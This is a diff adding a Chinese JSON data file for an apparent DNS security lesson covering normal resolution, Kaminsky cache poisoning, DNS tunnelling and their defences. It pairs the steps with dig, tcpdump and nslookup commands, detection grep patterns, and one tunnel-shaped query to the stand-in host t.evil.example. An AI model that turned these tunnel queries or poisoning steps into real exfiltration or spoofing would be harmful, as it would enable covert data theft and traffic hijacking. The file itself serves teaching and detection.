@@ -1,0 +1,664 @@
+{
+ "id": "dns",
+ "notes": {
+  "ID": {
+   "short": "16 位事务标识，可枚举",
+   "more": "查询方随机生成，应答必须原样复制。接收方只靠它把响应与待决查询配对，取值空间 65536，平均发三万多条候选就能命中。",
+   "sec": "它是整个协议唯一的血缘证明，也是 Kaminsky 攻击的全部成本。"
+  },
+  "QNAME": {
+   "short": "长度前缀域名，隧道塞数据",
+   "more": "域名不是点分字符串，而是“长度字节+标签”串，末字节 0x00 为根。单标签≤63 字节、全名≤255 字节，长度上限同时限定了隧道单包容量。",
+   "sec": "标签逼近 63 且熵值高，是隧道最硬的外形特征。"
+  },
+  "ANCOUNT": {
+   "short": "回答数，伪造时故意留空",
+   "more": "声明答案区记录条数。查询报文为 0，响应里是直接回答的条数。伪造者不知道真实 A 记录，只能把它写成 0，转而把内容塞进授权区。",
+   "sec": "“答不上来却给了指引”正是投毒报文的指纹。"
+  },
+  "NSCOUNT": {
+   "short": "授权数，投毒的注入点",
+   "more": "声明授权区条目数，原本用于告诉解析器下一步该问哪些权威服务器。它天然携带“与问题无关的指引”，因此是名字连锁攻击的落脚处。",
+   "sec": "问 A 却收到 B 域的 NS，说明解析权正在被移交。"
+  },
+  "TTL": {
+   "short": "缓存时长＝劫持时长",
+   "more": "记录可被缓存的秒数。易变的 A 记录通常 300~600 秒，稳定的 NS 记录约 172800 秒。写得越长，攻击者一次命中的收益越久。",
+   "sec": "陌生记录配上千古长 TTL，是伪造报文的强特征。"
+  },
+  "RDATA": {
+   "short": "记录数据，最终连向的地址",
+   "more": "按 TYPE 解释的载荷：A 记录是 4 字节 IPv4，TXT 是文本，NS 是主机名。用户最终连到哪个 IP，就由这串字节决定。",
+   "sec": "整个 DNS 安全体系要守的就是这 4 个字节。"
+  },
+  "ARCOUNT": {
+   "short": "附加数，放大与隧道特征",
+   "more": "声明附加区条目数，通常是 NS 对应的 A 记录，启用 EDNS 后至少为 1（OPT 伪记录）。异常偏大意味着响应体积异常。",
+   "sec": "小查询换来数 KB 应答，是反射放大与隧道的共同形状。"
+  },
+  "TYPE": {
+   "short": "资源类型，决定载荷怎么读",
+   "more": "2 字节类型值：A=1、NS=2、CNAME=5、MX=15、TXT=16、AAAA=28、OPT=41。同一段字节，类型不同解释完全不同。",
+   "sec": "TXT/NULL 记录频次异常是隐蔽信道的典型信号。"
+  }
+ },
+ "acts": [
+  {
+   "key": "normal",
+   "no": "第 1 幕",
+   "title": "它正常怎么工作",
+   "desc": "一次递归：主机委托、LDNS 迭代、权威给答案、缓存记住它",
+   "lead": "先看一次完整解析。注意两件事：答案只能由权威给出，而接收方判断“这是不是我的答案”只看 ID。",
+   "scenes": [
+    {
+     "name": "一次 A 记录解析",
+     "cmds": {
+      "linux": [
+       {
+        "c": "dig +norecurse @a.root-servers.net www.bank.example A",
+        "n": "直接问根且不递归：答案区为空、授权区给 .com，亲眼看到“只指路”",
+        "s": "补充（vault 无 dig，DNS 报文取证必备）"
+       },
+       {
+        "c": "dig +dnssec +multiline bank.example A",
+        "n": "带 DO 位查一次，输出里能看到 RRSIG；不加则只有 A 记录",
+        "s": "补充（vault 无 dig，看 DNSSEC 签名必备）"
+       },
+       {
+        "c": "sudo tcpdump -ni any -vv 'udp port 53'",
+        "n": "抓 53 端口：一行一条查询与应答，看 ID、端口、QNAME 是否成对",
+        "s": "补充（vault 无 tcpdump，抓包必备）"
+       }
+      ],
+      "ps": [
+       {
+        "c": "Resolve-DnsName bank.example -Type A",
+        "n": "本机解析结果与 TTL，等价 dig 的单行输出",
+        "s": "补充（vault 未收录 Resolve-DnsName，Windows 内置 DNS 查询）"
+       },
+       {
+        "c": "Get-DnsClientCache | Where-Object Entry -eq 'bank.example'",
+        "n": "看本机缓存里这条记录还剩多久（TimeToLive）",
+        "s": "补充（vault 未收录 Get-DnsClientCache，查本机缓存）"
+       }
+      ],
+      "cmd": [
+       {
+        "c": "nslookup -type=a bank.example",
+        "n": "最通用的解析查询；第二段是应答，看 Address 与 TTL",
+        "s": "《系统》Windows CMD.md · nslookup"
+       },
+       {
+        "c": "ipconfig /displaydns | findstr /i bank",
+        "n": "只挑出本机缓存里与 bank 有关的条目",
+        "s": "《系统》Windows CMD.md · ipconfig"
+       }
+      ]
+     },
+     "steps": [
+      {
+       "who": "客户端",
+       "to": "本地 DNS 服务器",
+       "pkt": 0,
+       "bubble": "Query A",
+       "hl": [
+        "ID",
+        "QNAME",
+        "QTYPE"
+       ],
+       "vals": {
+        "ID": "0x1a2b",
+        "QNAME": "www.bank.com",
+        "QTYPE": "A(1)"
+       },
+       "say": "客户端只发一次查询：要 www.bank.com 的 A 记录，并置 RD 期望递归。",
+       "sub": "它把整件事托给 LDNS，自己只等最终答案。"
+      },
+      {
+       "who": "本地 DNS 服务器",
+       "to": "根 / .com 顶级域",
+       "pkt": 0,
+       "bubble": "迭代问",
+       "hl": [
+        "Flags",
+        "QNAME",
+        "QTYPE"
+       ],
+       "vals": {
+        "Flags": "迭代时 RD=0，不再向下委托",
+        "QNAME": "www.bank.com",
+        "QTYPE": "A(1)"
+       },
+       "say": "LDNS 自己一站站问：每次只换来“下一步问谁”，不问到底。",
+       "sub": "递归的负担压在离用户最近这一跳。"
+      },
+      {
+       "who": "顶级域服务器",
+       "to": "本地 DNS 服务器",
+       "pkt": 1,
+       "bubble": "NS 指路",
+       "hl": [
+        "ANCOUNT",
+        "NSCOUNT",
+        "QNAME"
+       ],
+       "vals": {
+        "ANCOUNT": "0（只指路，不给答案）",
+        "NSCOUNT": "1（bank.com 的权威在哪）"
+       },
+       "say": "上游回的是“这事归谁管”，答案区空着——这条指令就是解析权。",
+       "sub": "凡是只指路不给答案的响应，都必须能验真。"
+      },
+      {
+       "who": "权威服务器",
+       "to": "本地 DNS 服务器",
+       "pkt": 1,
+       "bubble": "A 记录",
+       "hl": [
+        "NAME",
+        "TYPE",
+        "TTL",
+        "RDATA"
+       ],
+       "vals": {
+        "NAME": "0xC00C 压缩指针",
+        "TYPE": "A(1)",
+        "TTL": "300",
+        "RDATA": "192.168.1.10"
+       },
+       "say": "权威给出最终答案：192.168.1.10，允许缓存 300 秒。",
+       "sub": "名字用 2 字节指针省掉重复域名。"
+      },
+      {
+       "who": "本地 DNS 服务器",
+       "to": "客户端",
+       "pkt": 1,
+       "bubble": "缓存命中",
+       "hl": [
+        "ID",
+        "TTL",
+        "RDATA"
+       ],
+       "vals": {
+        "ID": "0x1a2b",
+        "TTL": "300 秒内直接复用",
+        "RDATA": "192.168.1.10"
+       },
+       "say": "300 秒内同域再问，LDNS 不再向上游核对，直接照缓存回答。",
+       "sub": "性能的关键，也是投毒的全部价值。"
+      },
+      {
+       "who": "客户端",
+       "to": "本地 DNS 服务器",
+       "pkt": 2,
+       "bubble": "EDNS(0)",
+       "hl": [
+        "ARCOUNT",
+        "CLASS",
+        "RDLENGTH"
+       ],
+       "vals": {
+        "ARCOUNT": "1（OPT 伪记录）",
+        "CLASS": "4096（UDP 载荷上限）",
+        "RDLENGTH": "0（无选项）"
+       },
+       "say": "附加区加一条 TYPE=41 的 OPT，把 UDP 载荷从 512 抬到 4096。",
+       "sub": "应答能更大，反射放大的倍数也跟着变大。"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "key": "attack",
+   "no": "第 2 幕",
+   "title": "它会被怎么打",
+   "desc": "抢答 6.5 万个 ID 改写缓存；把数据切碎塞进域名长期搬运",
+   "lead": "两个场景都只利用同一件事：接收方没有密码学凭据，只凭 ID、端口、源地址认答案。",
+   "scenes": [
+    {
+     "name": "Kaminsky 缓存投毒",
+     "cmds": {
+      "linux": [
+       {
+        "c": "dig +short @192.168.0.53 a1b2c3.bank.example",
+        "n": "复现第一步：查随机子域，正常应回空（NXDOMAIN）",
+        "s": "补充（vault 无 dig，DNS 报文取证必备）"
+       },
+       {
+        "c": "sudo tcpdump -ni any -vv 'udp port 53' | grep -i nxdomain",
+        "n": "盯 LDNS 的应答：真答案回来是 NXDOMAIN，被抢答就不是",
+        "s": "补充（vault 无 tcpdump，抓包必备）"
+       },
+       {
+        "c": "dig @192.168.0.53 bank.example A +noall +answer",
+        "n": "投毒后再查：TTL 变 172800 且指向陌生 IP，说明缓存已被改写",
+        "s": "补充（vault 无 dig，验证缓存是否被污染）"
+       }
+      ],
+      "ps": [
+       {
+        "c": "Resolve-DnsName a1b2c3.bank.example -Server 192.168.0.53",
+        "n": "指定 LDNS 查询，看它给 NXDOMAIN 还是伪造地址",
+        "s": "补充（vault 未收录 Resolve-DnsName）"
+       },
+       {
+        "c": "Get-DnsClientCache | Sort-Object TimeToLive -Descending | Select-Object -First 10",
+        "n": "按 TTL 倒序：异常长的 172800 会顶在最上面",
+        "s": "补充（vault 未收录 Get-DnsClientCache）"
+       }
+      ],
+      "cmd": [
+       {
+        "c": "nslookup a1b2c3.bank.example 192.168.0.53",
+        "n": "显式指定服务器查询，判断是否已被投毒",
+        "s": "《系统》Windows CMD.md · nslookup"
+       },
+       {
+        "c": "ipconfig /flushdns",
+        "n": "清空本机缓存，排除本地缓存干扰后复测",
+        "s": "《系统》Windows CMD.md · ipconfig"
+       }
+      ]
+     },
+     "steps": [
+      {
+       "who": "攻击者",
+       "to": "本地 DNS 服务器",
+       "pkt": 0,
+       "evil": true,
+       "bubble": "查随机子域",
+       "hl": [
+        "ID",
+        "QNAME",
+        "QTYPE"
+       ],
+       "vals": {
+        "ID": "0x1a2b",
+        "QNAME": "a1b2c3.bank.example",
+        "QTYPE": "A(1)"
+       },
+       "say": "先查一个必然不存在的随机子域，逼 LDNS 向上游发起一次查询。",
+       "sub": "真实答案必是 NXDOMAIN，伪造报文不会撞车。"
+      },
+      {
+       "who": "本地 DNS 服务器",
+       "to": "bank.example 权威",
+       "pkt": 0,
+       "bubble": "上游查询",
+       "hl": [
+        "Flags",
+        "QNAME"
+       ],
+       "vals": {
+        "Flags": "迭代 RD=0",
+        "QNAME": "a1b2c3.bank.example"
+       },
+       "say": "LDNS 带着随机源端口与 ID 去问权威，攻击者从旁路读走这两个值。",
+       "sub": "没有旁路只能盲猜，熵值决定胜率。"
+      },
+      {
+       "who": "攻击者",
+       "to": "本地 DNS 服务器",
+       "pkt": 1,
+       "evil": true,
+       "bubble": "抢答",
+       "hl": [
+        "ID",
+        "Flags",
+        "ANCOUNT",
+        "NSCOUNT"
+       ],
+       "vals": {
+        "ID": "0x0000→0xffff 逐个枚举",
+        "Flags": "0x8180 QR=1 AA=1",
+        "ANCOUNT": "0（答不上来，故意留空）",
+        "NSCOUNT": "1"
+       },
+       "say": "在真答案回来前灌入伪造响应，ID 从 0 数到 65535 挨个试。",
+       "sub": "每秒数十万包时，六万多个 ID 不到一秒扫完。"
+      },
+      {
+       "who": "攻击者",
+       "to": "本地 DNS 服务器",
+       "pkt": 1,
+       "evil": true,
+       "bubble": "塞 NS + A",
+       "hl": [
+        "NSCOUNT",
+        "ARCOUNT",
+        "TTL",
+        "RDATA"
+       ],
+       "vals": {
+        "NSCOUNT": "1：bank.example NS ns.evil.example",
+        "ARCOUNT": "1：ns.evil.example A 6.6.6.6",
+        "TTL": "172800",
+        "RDATA": "6.6.6.6"
+       },
+       "say": "答案区留空，却在授权区写“bank.example 归 ns.evil.example 管”。",
+       "sub": "我问你 A，你却教我整片域的权威是谁。"
+      },
+      {
+       "who": "本地 DNS 服务器",
+       "to": "受害者（全体用户）",
+       "pkt": 1,
+       "bubble": "缓存被改写",
+       "hl": [
+        "NAME",
+        "TTL",
+        "RDATA"
+       ],
+       "vals": {
+        "NAME": "0xC00C（指回问题名）",
+        "TTL": "172800（两天）",
+        "RDATA": "6.6.6.6"
+       },
+       "say": "缓存接受这条无关记录：两天内所有人查 bank.example 都去 6.6.6.6。",
+       "sub": "一次抢答，放大成一整片用户的劫持。"
+      }
+     ]
+    },
+    {
+     "name": "DNS 隧道（隐蔽信道）",
+     "cmds": {
+      "linux": [
+       {
+        "c": "sudo tcpdump -ni any -vv 'udp port 53' -A | grep -E '[a-z0-9]{40,}'",
+        "n": "抓出长度 40 以上的连续随机串，这就是隧道的形状",
+        "s": "补充（vault 无 tcpdump，抓包必备）"
+       },
+       {
+        "c": "dig +short TXT t.evil.example",
+        "n": "隧道常靠 TXT 下指令：手查一次看返回什么",
+        "s": "补充（vault 无 dig，TXT 记录查询）"
+       },
+       {
+        "c": "dig +short @192.168.0.53 \"$(head -c 40 /dev/urandom | base32 | tr -d =).t.evil.example\"",
+        "n": "自己造一个高熵子域，看解析器是否照单转发",
+        "s": "补充（vault 无 dig，构造隧道形状查询）"
+       }
+      ],
+      "ps": [
+       {
+        "c": "Resolve-DnsName -Name t.evil.example -Type TXT",
+        "n": "直接问到 TXT 内容，下行指令就在里面",
+        "s": "补充（vault 未收录 Resolve-DnsName）"
+       },
+       {
+        "c": "Get-DnsClientCache | Group-Object Entry | Where-Object Count -gt 20",
+        "n": "同一父域被反复查询 20 次以上，是隧道或 DGA 的信号",
+        "s": "补充（vault 未收录 Get-DnsClientCache）"
+       }
+      ],
+      "cmd": [
+       {
+        "c": "nslookup -type=txt t.evil.example",
+        "n": "查 TXT：正常业务极少用，隧道却靠它",
+        "s": "《系统》Windows CMD.md · nslookup"
+       },
+       {
+        "c": "nslookup -type=ns evil.example",
+        "n": "看这个域的权威是谁，是不是陌生 NS",
+        "s": "《系统》Windows CMD.md · nslookup"
+       }
+      ]
+     },
+     "steps": [
+      {
+       "who": "受控主机",
+       "to": "企业 DNS 服务器",
+       "pkt": 0,
+       "evil": true,
+       "bubble": "超长 A 查询",
+       "hl": [
+        "QNAME",
+        "QTYPE"
+       ],
+       "vals": {
+        "QNAME": "<base32 数据>.t.evil.example",
+        "QTYPE": "A(1)"
+       },
+       "say": "把待外传数据 base32 编码切成标签，一段段塞进域名里。",
+       "sub": "防火墙几乎不会拦 53 端口，也不审长域名。"
+      },
+      {
+       "who": "企业 DNS 服务器",
+       "to": "攻击者权威",
+       "pkt": 0,
+       "bubble": "代为转发",
+       "hl": [
+        "QNAME",
+        "Flags"
+       ],
+       "vals": {
+        "QNAME": "同一超长名字",
+        "Flags": "迭代 RD=0"
+       },
+       "say": "企业解析器原样转发，它不区分业务查询与隧道查询。",
+       "sub": "自己成了免费的中继与清洗器。"
+      },
+      {
+       "who": "攻击者权威",
+       "to": "企业 DNS 服务器",
+       "pkt": 1,
+       "evil": true,
+       "bubble": "TXT 回令",
+       "hl": [
+        "TYPE",
+        "RDLENGTH",
+        "RDATA",
+        "TTL"
+       ],
+       "vals": {
+        "TYPE": "TXT(16)",
+        "RDLENGTH": "指令长度",
+        "RDATA": "base64 指令",
+        "TTL": "0"
+       },
+       "say": "下行指令放进 TXT 记录，搭同一次查询的应答回来。",
+       "sub": "不新建连接，不触发任何入站策略。"
+      },
+      {
+       "who": "企业 DNS 服务器",
+       "to": "受控主机",
+       "pkt": 1,
+       "bubble": "递归应答",
+       "hl": [
+        "RDATA",
+        "TTL"
+       ],
+       "vals": {
+        "RDATA": "base64 指令",
+        "TTL": "0（不留缓存痕迹）"
+       },
+       "say": "受控主机解出指令执行，结果再按下一次查询带出去。",
+       "sub": "上下行共用一条只放行 53 的通道。"
+      },
+      {
+       "who": "受控主机",
+       "to": "攻击者权威",
+       "pkt": 2,
+       "evil": true,
+       "bubble": "EDNS 提容量",
+       "hl": [
+        "ARCOUNT",
+        "CLASS",
+        "RDLENGTH"
+       ],
+       "vals": {
+        "ARCOUNT": "1（OPT）",
+        "CLASS": "4096（单包带更多数据）",
+        "RDLENGTH": "0"
+       },
+       "say": "用 EDNS 把单包容量抬到 4KB，搬运速度随之上升。",
+       "sub": "固定间隔、高熵子域，形状极其规律。"
+      }
+     ]
+    }
+   ]
+  },
+  {
+   "key": "defend",
+   "no": "第 3 幕",
+   "title": "防护在哪一步掐断它",
+   "desc": "先抬熵让伪造报文落地，再用签名与证书兜住最坏情况",
+   "lead": "两条攻击重放一遍：抢答被随机化与 bailiwick 拒收挡住，隧道被出口的形状检测挡住。",
+   "scenes": [
+    {
+     "name": "随机化 + 验签 + 形状检测",
+     "cmds": {
+      "linux": [
+       {
+        "c": "dig +dnssec +short bank.example A",
+        "n": "有 RRSIG 说明该域确实在签；返回空说明 DNSSEC 没落地",
+        "s": "补充（vault 无 dig，验签要看 RRSIG）"
+       },
+       {
+        "c": "dig +norecurse @192.168.0.53 www.bank.example",
+        "n": "对 LDNS 用非递归查询，只服务授权网段时会回 REFUSED",
+        "s": "补充（vault 无 dig，验证是否开放递归）"
+       },
+       {
+        "c": "sudo tcpdump -ni any -vv 'udp port 53' | grep -c '172800'",
+        "n": "统计异常长 TTL 出现次数，大于 0 说明还有伪造报文",
+        "s": "补充（vault 无 tcpdump，抓包必备）"
+       }
+      ],
+      "ps": [
+       {
+        "c": "Resolve-DnsName bank.example -DnssecOk",
+        "n": "置 DO 位查询，能看出应答里带没带 RRSIG",
+        "s": "补充（vault 未收录 Resolve-DnsName）"
+       },
+       {
+        "c": "Get-DnsClientCache | Measure-Object | Select-Object Count",
+        "n": "对比阻断前后的缓存条目总数，判断投毒是否仍在发生",
+        "s": "补充（vault 未收录 Get-DnsClientCache）"
+       }
+      ],
+      "cmd": [
+       {
+        "c": "nslookup -type=rrsig bank.example",
+        "n": "查签名记录，没有就是该域未启用 DNSSEC",
+        "s": "《系统》Windows CMD.md · nslookup"
+       },
+       {
+        "c": "ipconfig /flushdns",
+        "n": "清掉可能已污染的本地缓存，从干净状态复测",
+        "s": "《系统》Windows CMD.md · ipconfig"
+       }
+      ]
+     },
+     "steps": [
+      {
+       "who": "本地 DNS 服务器",
+       "to": "bank.example 权威",
+       "pkt": 0,
+       "bubble": "随机化",
+       "hl": [
+        "ID",
+        "QNAME",
+        "Flags"
+       ],
+       "vals": {
+        "ID": "强随机 16 位",
+        "QNAME": "wWw.BaNk.ExAmPlE（0x20 编码）",
+        "Flags": "RD=0"
+       },
+       "say": "每次查询随机源端口，并在域名里随机改大小写。",
+       "sub": "要同时猜中 ID、端口和每一位大小写。"
+      },
+      {
+       "who": "攻击者",
+       "to": "本地 DNS 服务器",
+       "pkt": 1,
+       "evil": true,
+       "bubble": "猜错被丢",
+       "hl": [
+        "ID",
+        "QNAME",
+        "Flags"
+       ],
+       "vals": {
+        "ID": "命中率 1/65536 × 端口数 × 2^字母数",
+        "QNAME": "大小写与原查询不符",
+        "Flags": "ID 不匹配 → 丢弃"
+       },
+       "say": "伪造报文在端口、ID 或大小写上错一位，就被当成无关报文丢弃。",
+       "sub": "抬高的只是成本，不是认证。"
+      },
+      {
+       "who": "本地 DNS 服务器",
+       "to": "攻击者",
+       "pkt": 1,
+       "bubble": "bailiwick 拒收",
+       "hl": [
+        "NSCOUNT",
+        "ARCOUNT",
+        "TTL"
+       ],
+       "vals": {
+        "NSCOUNT": "1（与问题域无关 → 拒收）",
+        "ARCOUNT": "1（连带丢弃）",
+        "TTL": "172800 异常长 → 告警"
+       },
+       "say": "只接受与问题域直接相关的记录：问 A 就只收 A，NS 一律不缓存。",
+       "sub": "名字连锁攻击在这里断链。"
+      },
+      {
+       "who": "权威服务器",
+       "to": "本地 DNS 服务器",
+       "pkt": 1,
+       "bubble": "DNSSEC 验签",
+       "hl": [
+        "TYPE",
+        "RDLENGTH",
+        "RDATA"
+       ],
+       "vals": {
+        "TYPE": "A + RRSIG",
+        "RDLENGTH": "4 + 签名长度",
+        "RDATA": "192.168.1.10"
+       },
+       "say": "DNSSEC 私钥签名、公钥验签，伪造报文算不出匹配的摘要。",
+       "sub": "只保真实性与完整性，报文仍是明文。"
+      },
+      {
+       "who": "企业 DNS 服务器",
+       "to": "出口监控",
+       "pkt": 0,
+       "bubble": "形状检测",
+       "hl": [
+        "QNAME",
+        "QTYPE"
+       ],
+       "vals": {
+        "QNAME": "标签 61 字节、熵值偏高 → 告警",
+        "QTYPE": "TXT 频次异常"
+       },
+       "say": "出口按形状检测：超长标签、高熵子域、TXT 频次异常，直接阻断。",
+       "sub": "不看内容看形状，加密也藏不住。"
+      },
+      {
+       "who": "受害者",
+       "to": "6.6.6.6（攻击者主机）",
+       "pkt": 1,
+       "bubble": "证书兜底",
+       "hl": [
+        "RDATA",
+        "TTL"
+       ],
+       "vals": {
+        "RDATA": "6.6.6.6",
+        "TTL": "缓存已按 300 秒过期"
+       },
+       "say": "请求发到 6.6.6.6 后，证书不是 bank.example，浏览器直接断连。",
+       "sub": "凭据没交出去——应用层加密兜住了 DNS。"
+      }
+     ]
+    }
+   ]
+  }
+ ]
+}
